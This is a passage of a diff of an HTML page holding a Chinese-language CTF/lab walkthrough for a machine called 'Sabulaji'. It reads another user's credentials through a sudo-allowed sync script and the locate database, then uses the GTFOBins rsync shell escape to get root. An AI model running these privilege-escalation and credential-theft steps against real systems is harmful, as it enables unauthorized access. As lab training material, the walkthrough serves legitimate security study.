 welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /tmp/a/personal/notes.txt
-no update</pre></div>
+no update
+</code></pre>
 <p>接下来就是找看看<code class="notranslate">/home/sabulaji/</code>目录下藏了啥</p>
 <h5><code class="notranslate">locate</code>数据库<code class="notranslate">mlocate.db </code></h5>
 <p>同时注意到<code class="notranslate">welcome</code>用户多了一个权限 <code class="notranslate">123(mlocate)</code>，翻一下这个属组相关的文件：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:<span class="pl-k">~</span>$ id
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:~$ id
 uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
 
-welcome@Sabulaji:/tmp$ find / -group mlocate <span class="pl-k">2&gt;</span>/dev/null
+welcome@Sabulaji:/tmp$ find / -group mlocate 2&gt;/dev/null
 /usr/bin/mlocate
 /etc/rsyncd.conf
 /etc/rsyncd.secrets
@@ -527,92 +546,100 @@ welcome@Sabulaji:/tmp$ find / -group mlocate <span class="pl-k">2&gt;</span>/dev
 /var/cache/locate/locatedb
 /srv/rsync/public/todo.list
 welcome@Sabulaji:/tmp$ ls -l /var/lib/mlocate/mlocate.db
--rw-r----- 1 root mlocate 1240438 Jun 14 00:22 /var/lib/mlocate/mlocate.db</pre></div>
+-rw-r----- 1 root mlocate 1240438 Jun 14 00:22 /var/lib/mlocate/mlocate.db
+</code></pre>
 <p>​      在<code class="notranslate">var/lib/mlocate/</code>目录发现数据库文件 <code class="notranslate">mlocate.db</code>。<code class="notranslate">mlocate.db</code> 由 <code class="notranslate">updatedb</code> 命令生成，包含系统中所有文件的路径信息（如文件名、目录结构）。用户执行 <code class="notranslate">locate</code> 命令时，直接查询此数据库而非扫描磁盘，速度远超 <code class="notranslate">find</code> 等实时扫描工具</p>
 <p>​	看一下<code class="notranslate">locate </code>命令，有<code class="notranslate"> SGID</code> 权限<br>
 <code class="notranslate">SGID </code>作用：当普通用户执行 <code class="notranslate">locate</code>时，进程会临时以<code class="notranslate"> mlocate</code> 组身份运行（而非用户原属组），从而只读访问数据库</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ ls -l /usr/bin/locate
-lrwxrwxrwx 1 root root 24 May 15 11:45 /usr/bin/locate -<span class="pl-k">&gt;</span> /etc/alternatives/locate
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:/tmp$ ls -l /usr/bin/locate
+lrwxrwxrwx 1 root root 24 May 15 11:45 /usr/bin/locate -&gt; /etc/alternatives/locate
 ls -l /usr/bin/mlocate
 welcome@Sabulaji:/tmp$ ls -l /usr/bin/mlocate
--rwxr-sr-x 1 root mlocate 43240 Dec  2  2020 /usr/bin/mlocate  <span class="pl-c"><span class="pl-c">#</span> SGID 位（r-s 中的 's'）</span>
+-rwxr-sr-x 1 root mlocate 43240 Dec  2  2020 /usr/bin/mlocate  # SGID 位（r-s 中的 's'）
 权限继承：因 mlocate 组对数据库有读权限（r--），用户通过命令间接获得访问权。
-</pre></div>
+
+</code></pre>
 <p>尝试定位一下 <code class="notranslate">/opt/sync.sh</code>脚本的禁止字符相关的文件：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ locate <span class="pl-k">*</span>sabulaji<span class="pl-k">*</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:/tmp$ locate *sabulaji*
 /home/sabulaji
 /home/sabulaji/.bash_history
 /home/sabulaji/.bash_logout
 /home/sabulaji/.bashrc
 /home/sabulaji/.profile
 /home/sabulaji/personal
-welcome@Sabulaji:/tmp$ cat /var/lib/mlocate/mlocate.db <span class="pl-k">|</span> grep abulaji
+welcome@Sabulaji:/tmp$ cat /var/lib/mlocate/mlocate.db | grep abulaji
 Binary file (standard input) matches
-welcome@Sabulaji:/tmp$ hexdump -C /var/lib/mlocate/mlocate.db <span class="pl-k">|</span> grep -i sabulaji
-00008cb0  00 2f 68 6f 6d 65 2f 73  61 62 75 6c 61 6a 69 00  <span class="pl-k">|</span>./home/sabulaji.<span class="pl-k">|</span>
-00008d10  2f 73 61 62 75 6c 61 6a  69 2f 70 65 72 73 6f 6e  <span class="pl-k">|</span>/sabulaji/person<span class="pl-k">|</span>
-welcome@Sabulaji:/tmp$ strings /var/lib/mlocate/mlocate.db <span class="pl-k">|</span> grep -i sabulaji
+welcome@Sabulaji:/tmp$ hexdump -C /var/lib/mlocate/mlocate.db | grep -i sabulaji
+00008cb0  00 2f 68 6f 6d 65 2f 73  61 62 75 6c 61 6a 69 00  |./home/sabulaji.|
+00008d10  2f 73 61 62 75 6c 61 6a  69 2f 70 65 72 73 6f 6e  |/sabulaji/person|
+welcome@Sabulaji:/tmp$ strings /var/lib/mlocate/mlocate.db | grep -i sabulaji
 sabulaji
 /home/sabulaji
 /home/sabulaji/personal
-welcome@Sabulaji:/tmp$ xxd /var/lib/mlocate/mlocate.db <span class="pl-k">|</span> grep -i sabulaji -A 5
+welcome@Sabulaji:/tmp$ xxd /var/lib/mlocate/mlocate.db | grep -i sabulaji -A 5
 00008cb0: 002f 686f 6d65 2f73 6162 756c 616a 6900  ./home/sabulaji.
 00008cc0: 002e 6261 7368 5f68 6973 746f 7279 0000  ..bash_history..
 00008cd0: 2e62 6173 685f 6c6f 676f 7574 0000 2e62  .bash_logout...b
 00008ce0: 6173 6872 6300 002e 7072 6f66 696c 6500  ashrc...profile.
 00008cf0: 0170 6572 736f 6e61 6c00 0200 0000 0068  .personal......h
-00008d00: 26ce 352d 89b7 0000 0000 002f 686f 6d65  <span class="pl-k">&amp;</span>.5-......./home
+00008d00: 26ce 352d 89b7 0000 0000 002f 686f 6d65  &amp;.5-......./home
 00008d10: 2f73 6162 756c 616a 692f 7065 7273 6f6e  /sabulaji/person
 00008d20: 616c 0000 6372 6564 732e 7478 7400 006e  al..creds.txt..n
-00008d30: 6f74 6573 2e74 7874 0002 0000 0000 6826  otes.txt......h<span class="pl-k">&amp;</span>
+00008d30: 6f74 6573 2e74 7874 0002 0000 0000 6826  otes.txt......h&amp;
 00008d40: cb6a 12d5 c700 0000 0000 2f68 6f6d 652f  .j......../home/
 00008d50: 7765 6c63 6f6d 6500 002e 6261 7368 5f68  welcome...bash_h
-00008d60: 6973 746f 7279 0000 2e62 6173 685f 6c6f  istory...bash_lo</pre></div>
+00008d60: 6973 746f 7279 0000 2e62 6173 685f 6c6f  istory...bash_lo
+</code></pre>
 <p>目录<code class="notranslate">/home/sabulaji/personal</code>下发现 <code class="notranslate">creds.txt</code> 文件，读取内容（只显示差异，所以前后读不通文件）</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /tmp/a/personal/creds.txt
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /tmp/a/personal/creds.txt
 Difference: 0a1
-<span class="pl-k">&gt;</span> Sensitive Credentials:Z2FzcGFyaW4=
+&gt; Sensitive Credentials:Z2FzcGFyaW4=
 [+] Updated.
-welcome@Sabulaji:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Z2FzcGFyaW4=<span class="pl-pds">"</span></span> <span class="pl-k">|</span> base64 -d
+welcome@Sabulaji:/tmp$ echo "Z2FzcGFyaW4=" | base64 -d
 gasparinwelcome@Sabulaji:/tmp$ 
-<span class="pl-c"><span class="pl-c">#</span>不用软连接也可以清空后用通配符</span>
+#不用软连接也可以清空后用通配符
 welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /dev/null
 Difference: 1d0
-<span class="pl-k">&lt;</span> Sensitive Credentials:Z2FzcGFyaW4=
+&lt; Sensitive Credentials:Z2FzcGFyaW4=
 [+] Updated.
-welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabula<span class="pl-k">*</span>/personal/creds.txt
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabula*/personal/creds.txt
 Difference: 0a1
-<span class="pl-k">&gt;</span> Sensitive Credentials:Z2FzcGFyaW4=
-[+] Updated.</pre></div>
+&gt; Sensitive Credentials:Z2FzcGFyaW4=
+[+] Updated.
+</code></pre>
 <p>获得关键信息 <code class="notranslate">Z2FzcGFyaW4=</code>,别<code class="notranslate">base64</code>解码了，经测试这个就是<code class="notranslate">sabulaji</code>的密码</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/home$ su - sabulaji
-Password: <span class="pl-c"><span class="pl-c">#</span>Z2FzcGFyaW4=</span>
-sabulaji@Sabulaji:<span class="pl-k">~</span>$ ls
+<pre lang="shell" class="notranslate"><code class="notranslate">welcome@Sabulaji:/home$ su - sabulaji
+Password: #Z2FzcGFyaW4=
+sabulaji@Sabulaji:~$ ls
 personal
-sabulaji@Sabulaji:<span class="pl-k">~</span>$ id
-uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)</pre></div>
+sabulaji@Sabulaji:~$ id
+uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)
+</code></pre>
 <p>获得<code class="notranslate">sabulaji</code>的账号密码信息为<code class="notranslate">sabulaji:Z2FzcGFyaW4=</code></p>
 <h3>5.获得root</h3>
 <p><code class="notranslate">sudo</code>发现所有用户能够以 <code class="notranslate">root </code>身份运行 <code class="notranslate">/usr/bin/rsync</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sabulaji@Sabulaji:<span class="pl-k">~</span>$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> sabulaji on Sabulaji:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+<pre lang="shell" class="notranslate"><code class="notranslate">sabulaji@Sabulaji:~$ sudo -l
+Matching Defaults entries for sabulaji on Sabulaji:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User sabulaji may run the following commands on Sabulaji:
-    (ALL) NOPASSWD: /usr/bin/rsync</pre></div>
+    (ALL) NOPASSWD: /usr/bin/rsync
+</code></pre>
 <p>[<a href="https://gtfobins.github.io/" rel="nofollow">查阅</a>](<a href="https://gtfobins.github.io/)%60" rel="nofollow">https://gtfobins.github.io/)`</a> GTFObins<code class="notranslate">，有现成的 </code>rsync` 提权方案</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>sudo rsync -e 'sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"' 127.0.0.1:/dev/null</span>
-sabulaji@Sabulaji:<span class="pl-k">~</span>$ sudo rsync -e <span class="pl-s"><span class="pl-pds">'</span>sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"<span class="pl-pds">'</span></span> 127.0.0.1:/dev/null
-<span class="pl-c"><span class="pl-c">#</span> id</span>
-uid=0(root) gid=0(root) groups=0(root)</pre></div>
-<h5>拿到<code class="notranslate">root.txt</code></h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> id</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">#sudo rsync -e 'sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"' 127.0.0.1:/dev/null
+sabulaji@Sabulaji:~$ sudo rsync -e 'sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"' 127.0.0.1:/dev/null
+# id
 uid=0(root) gid=0(root) groups=0(root)
-<span class="pl-c"><span class="pl-c">#</span> cd</span>
-<span class="pl-c"><span class="pl-c">#</span> ls</span>
+</code></pre>
+<h5>拿到<code class="notranslate">root.txt</code></h5>
+<pre lang="shell" class="notranslate"><code class="notranslate"># id
+uid=0(root) gid=0(root) groups=0(root)
+# cd
+# ls
 root.txt
-<span class="pl-c"><span class="pl-c">#</span> cat root.txt</span>
-</pre></div></div>
+# cat root.txt
+
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
